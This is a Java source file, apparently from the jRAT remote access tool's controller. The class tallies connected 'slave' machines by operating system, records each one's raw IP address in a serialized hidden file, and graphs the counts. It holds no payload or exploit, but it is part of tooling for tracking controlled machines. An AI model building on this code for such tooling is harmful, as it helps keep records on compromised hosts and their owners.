package se.jrat.client.settings;

import java.awt.Color;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;

import se.jrat.client.AbstractSlave;
import se.jrat.client.Globals;
import se.jrat.client.ui.frames.Frame;
import se.jrat.client.utils.IconUtils;
import se.jrat.common.Logger;

import com.redpois0n.graphs.graph.GraphEntry;
import com.redpois0n.oslib.Icons;
import com.redpois0n.oslib.OperatingSystem;

public class OperatingSystemStatistics extends AbstractSettings implements Serializable {

	private static final long serialVersionUID = 3444250505850670708L;

	private static final OperatingSystemStatistics instance = new OperatingSystemStatistics();

	private transient List<OperatingSystemStatEntry> list = new ArrayList<OperatingSystemStatEntry>();

	public static OperatingSystemStatistics getGlobal() {
		return instance;
	}

	public static boolean isTracking() {
		return Settings.getGlobal().getBoolean("stats");
	}

	public List<OperatingSystemStatEntry> getList() {
		return list;
	}

	public OperatingSystemStatEntry getEntry(String str, OperatingSystem os) {
		for (int i = 0; i < list.size(); i++) {
			OperatingSystemStatEntry entry = list.get(i);
			if (entry.getString().equalsIgnoreCase(str)) {
				return entry;
			}
		}

		OperatingSystemStatEntry stat = new OperatingSystemStatEntry();
		stat.setString(str);;
		stat.setOs(os);

		list.add(stat);
		Logger.log("Added: " + str);
		return stat;
	}

	@Override
	@SuppressWarnings("unchecked")
	public void load() throws Exception {
		if (!isTracking()) {
			return;
		}

		ObjectInputStream str = new ObjectInputStream(new FileInputStream(getFile()));
		list = (ArrayList<OperatingSystemStatEntry>) str.readObject();
		str.close();
		reload();
	}

	public void save() throws Exception {
		if (!isTracking()) {
			return;
		}

		ObjectOutputStream str = new ObjectOutputStream(new FileOutputStream(getFile()));
		str.writeObject(list);
		str.close();
	}

	public void add(AbstractSlave abstractSlave) {
		if (!isTracking()) {
			return;
		}

		OperatingSystemStatEntry entry = getEntry(abstractSlave.getOperatingSystem(), abstractSlave.getOS());

		entry.connects++;
		boolean exists = false;
		for (String str : entry.list) {
			if (str.equals(abstractSlave.getRawIP())) {
				exists = true;
			}
		}
		if (!exists) {
			entry.list.add(0, abstractSlave.getRawIP());
		}
		reload();
	}

	public void reload() {
		Frame.panelStats.osGraph.clear();

		for (int i = 0; i < list.size(); i++) {
			OperatingSystemStatEntry entry = list.get(i);
			try {

				GraphEntry total = new GraphEntry(entry.getString(), entry.getConnects(), IconUtils.getIcon(Icons.getIconString(entry.getOs(), entry.getString())));
				//GraphEntry unique = new GraphEntry(entry.getOS(), entry.getList().size());
				total.setNumberColor(Color.gray);
				Frame.panelStats.osGraph.add(total);
				//Frame.panelStats.osGraph.add(unique);
				Frame.panelStats.repaint();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public int getNoConnects() {
		int no = 0;
		for (OperatingSystemStatEntry e : list) {
			no += e.connects;
		}
		return no;
	}

	public int getDifferentConnects() {
		int no = 0;
		for (OperatingSystemStatEntry e : list) {
			no += e.list.size();
		}
		return no;
	}

	public class OperatingSystemStatEntry implements Serializable {

		private static final long serialVersionUID = 7061542468278914135L;
		
		private OperatingSystem os;
		private String str = "Unknown";
		private Integer connects = 0;
		
		private List<String> list = new ArrayList<String>();

		public String getString() {
			return str;
		}

		public void setString(String os) {
			this.str = os;
		}

		public List<String> getList() {
			return list;
		}
		
		public void setList(List<String> list) {
			this.list = list;
		}
		
		public int getConnects() {
			return this.connects;
		}
		
		public void setConnects(int connects) {
			this.connects = connects;
		}

		public OperatingSystem getOs() {
			return os;
		}

		public void setOs(OperatingSystem os) {
			this.os = os;
		}

	}

	@Override
	public File getFile() {
		return new File(Globals.getSettingsDirectory(), ".osstats");
	}

}
